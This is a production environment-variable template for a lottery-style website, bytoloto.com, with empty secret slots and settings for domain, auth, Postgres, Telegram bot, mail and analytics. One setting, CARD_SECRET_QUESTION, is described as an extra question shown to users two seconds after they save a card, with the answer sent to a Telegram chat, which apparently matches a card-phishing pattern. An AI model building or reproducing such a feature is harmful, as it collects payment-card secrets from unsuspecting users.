# Production settings for bytoloto.com (docker compose on the VPS).
# setup-server.sh copies this to /opt/bytoloto/.env and generates the secrets.

# ---------- Domain ----------
SITE_DOMAIN=bytoloto.com
STATS_DOMAIN=stats.bytoloto.com
ACME_EMAIL=admin@bytoloto.com
BETTER_AUTH_URL=https://bytoloto.com
NEXT_PUBLIC_SITE_URL=https://bytoloto.com
NEXT_PUBLIC_SITE_NAME=bytoloto.com
TRUSTED_ORIGINS=https://www.bytoloto.com

# ---------- Secrets (generated by setup-server.sh) ----------
BETTER_AUTH_SECRET=
# Admin panel password and Telegram webhook signing key
ADMIN_SECRET=
POSTGRES_PASSWORD=
CRON_SECRET=
UMAMI_APP_SECRET=

# ---------- Telegram admin bot ----------
# Token from @BotFather; numeric chat id of the admin chat (e.g. 123456789 or -100...)
# Optional legacy fallback: the bot token and admin user IDs are set in Admin -> Telegram.
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=
# Дополнительный вопрос, который пользователь видит через 2 с после сохранения карты; ответ уходит в Telegram. Пусто — вопрос не задаётся.
CARD_SECRET_QUESTION=

# ---------- Mail ----------
SMTP_HOST=
SMTP_PORT=587
SMTP_SECURE=false
SMTP_USER=
SMTP_PASS=
MAIL_FROM="bytoloto.com <no-reply@bytoloto.com>"
RESEND_API_KEY=
REQUIRE_EMAIL_VERIFICATION=


# ---------- Analytics (optional) ----------
NEXT_PUBLIC_UMAMI_SCRIPT_URL=
NEXT_PUBLIC_UMAMI_WEBSITE_ID=

# ---------- Operator details ----------
NEXT_PUBLIC_SUPPORT_EMAIL=support@bytoloto.com
NEXT_PUBLIC_SUPPORT_HOURS="ежедневно с 9:00 до 21:00"

BACKUP_KEEP_DAYS=14
